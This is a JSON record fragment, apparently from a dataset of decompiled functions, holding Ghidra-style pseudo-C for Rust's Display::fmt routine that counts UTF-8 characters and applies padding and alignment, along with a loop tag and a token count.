            "contain loop"
        ],
        "decompiled_code": "\nuint64_t sym._T_as_core::fmt::Display_::fmt::ha1fa84016a26224a(ulong *arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    unkbyte7 Var11;\n    uint8_t *puVar12;\n    uint8_t *arg1_00;\n    uint8_t *arg2_00;\n    int16_t iVar13;\n    int64_t iVar20;\n    uint8_t uVar26;\n    char cVar29;\n    char cVar30;\n    char cVar31;\n    uchar auVar27 [16];\n    uchar auVar28 [16];\n    uchar auVar32 [16];\n    uchar auVar33 [16];\n    unkuint3 Var14;\n    uint32_t uVar15;\n    unkuint5 Var16;\n    unkuint6 Var17;\n    unkuint7 Var18;\n    uint64_t uVar19;\n    unkbyte9 Var21;\n    unkbyte10 Var22;\n    uchar auVar23 [11];\n    uchar auVar24 [12];\n    uchar auVar25 [13];\n    \n    // <&T as core::fmt::Display>::fmt::ha1fa84016a26224a\n    arg1_00 = **arg1;\n    arg2_00 = (*arg1)[2];\n    if ((*arg2 != 1) && (arg2[2] != 1)) goto code_r0x004073e4;\n    if (arg2[2] == 1) {\n        puVar6 = NULL;\n        puVar12 = arg1_00;\n        for (iVar8 = arg2[3]; iVar8 != 0; iVar8 = iVar8 + -1) {\n            if (puVar12 == arg1_00 + arg2_00) goto code_r0x00407211;\n            uVar26 = *puVar12;\n            if (uVar26 < '\\0') {\n                if (uVar26 < 0xe0) {\n                    puVar7 = puVar12 + 2;\n                }\n                else if (uVar26 < 0xf0) {\n                    puVar7 = puVar12 + 3;\n                }\n                else {\n                    if ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc |\n                        (uVar26 & 7) << 0x12) == 0x110000) goto code_r0x00407211;\n                    puVar7 = puVar12 + 4;\n                }\n            }\n            else {\n                puVar7 = puVar12 + 1;\n            }\n            puVar6 = puVar7 + (puVar6 - puVar12);\n            puVar12 = puVar7;\n        }\n        if ((puVar12 != arg1_00 + arg2_00) &&\n           ((((uVar26 = *puVar12,  -1 < uVar26 || (uVar26 < 0xe0)) || (uVar26 < 0xf0)) ||\n            ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc | (uVar26 & 7) << 0x12) !=\n             0x110000)))) {\n            puVar12 = arg1_00;\n            if (puVar6 == NULL) {\n                puVar7 = NULL;\n            }\n            else if (puVar6 < arg2_00) {\n                puVar7 = puVar6;\n                if (arg1_00[puVar6] < -0x40) {\ncode_r0x00407204:\n                    puVar7 = puVar6;\n                    puVar12 = NULL;\n                }\n            }\n            else {\n                puVar7 = arg2_00;\n                if (puVar6 != arg2_00) goto code_r0x00407204;\n            }\n            if (puVar12 != NULL) {\n                arg1_00 = puVar12;\n                arg2_00 = puVar7;\n            }\n        }\n    }\ncode_r0x00407211:\n    if (*arg2 == 0) goto code_r0x004073e4;\n    uVar5 = arg2[1];\n    if (arg2_00 < 0x20) {\n        if (arg2_00 == NULL) {\n            uVar4 = 0;\n        }\n        else {\n            if (arg2_00 == 0x1) {\n                uVar4 = 0;\n                puVar12 = arg1_00;\n            }\n            else {\n                puVar12 = arg2_00 & 0xfffffffffffffffe;\n                uVar4 = (puVar12 + -2 >> 1) + 1;\n                uVar9 = uVar4 & 3;\n                if (puVar12 + -2 < 0x6) {\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                }\n                else {\n                    uVar4 = uVar4 & 0xfffffffffffffffc;\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar27 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 2));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 2) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 4));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 4) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar33 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 6));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 6) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar32 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        iVar20 = SUB168(auVar32, 0) +\n                                 SUB168(auVar33, 0) + SUB168(auVar28, 0) + SUB168(auVar27, 0) + iVar20;\n                        iVar10 = SUB168(auVar32 >> 0x40, 0) +\n                                 SUB168(auVar33 >> 0x40, 0) + SUB168(auVar28 >> 0x40, 0) +\n                                 SUB168(auVar27 >> 0x40, 0) + iVar10;\n                        iVar8 = iVar8 + 8;\n                        uVar4 = uVar4 - 4;\n                    } while (uVar4 != 0);\n                }\n                if (uVar9 != 0) {\n                    iVar3 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar3 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar3 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar4 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar4);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar4))\n                                                            >> 0x40, 0), (uVar4 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        iVar20 = iVar20 + SUB168(auVar28, 0);\n                        iVar10 = iVar10 + SUB168(auVar28 >> 0x40, 0);\n                        iVar3 = iVar3 + 2;\n                    } while (uVar9 * 2 != iVar3);\n                }\n                uVar4 = iVar10 + iVar20;\n                if (arg2_00 == puVar12) goto code_r0x004073c7;\n                puVar12 = puVar12 + arg1_00;\n            }\n            do {\n                uVar26 = *puVar12;\n                puVar12 = puVar12 + 1;\n                uVar4 = uVar4 + (-0x41 < uVar26);\n            } while (puVar12 != arg1_00 + arg2_00);\n        }\n    }\n    else {\n        uVar4 = dbg.do_count_chars(arg1_00, arg2_00);\n    }\ncode_r0x004073c7:\n    uVar9 = uVar5 - uVar4;\n    if (uVar4 <= uVar5 && uVar9 != 0) {\n        cVar2 = *(arg2 + 7);\n        if (cVar2 == '\\x03') {\n            cVar2 = '\\0';\n        }\n        if (cVar2 == '\\0') {\n            uVar5 = 0;\n        }\n        else if (cVar2 == '\\x01') {\n            uVar5 = uVar9;\n            uVar9 = 0;\n        }\n        else {\n            uVar5 = uVar9 >> 1;\n            uVar9 = uVar9 + 1 >> 1;\n        }\n        iVar8 = arg2[4];\n        iVar20 = arg2[5];\n        iVar1 = *(arg2 + 0x34);\n        iVar10 = uVar5 + 1;\n        do {\n            iVar10 = iVar10 + -1;\n            Var11 = iVar10 >> 8;\n            if (iVar10 == 0) {\n                uVar5 = CONCAT71(Var11, 1);\n                if ((iVar1 == 0x110000) || (cVar2 = (**(iVar20 + 0x18))(iVar8, arg1_00, arg2_00),  cVar2 != '\\0'))\n                goto code_r0x004074a6;\n                uVar5 = 0xffffffffffffffff;\n                goto code_r0x00407480;\n            }\n            cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        } while (cVar2 == '\\0');\n        uVar5 = CONCAT71(Var11, 1);\ncode_r0x004074a6:\n        return uVar5 & 0xffffffff;\n    }\ncode_r0x004073e4:\n    // WARNING: Could not recover jumptable at 0x00407406. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar5 = (**(arg2[5] + 0x18))(arg2[4], arg1_00, arg2_00);\n    return uVar5;\n    while( true ) {\n        cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        uVar4 = uVar5 + 1;\n        uVar5 = uVar4;\n        if (cVar2 != '\\0') break;\ncode_r0x00407480:\n        uVar4 = uVar9;\n        if (uVar5 - uVar9 == -1) break;\n    }\n    uVar5 = uVar4 & 0xffffffffffffff00 | uVar4 < uVar9;\n    goto code_r0x004074a6;\n}\n",
        "token_count": 6298
    }
}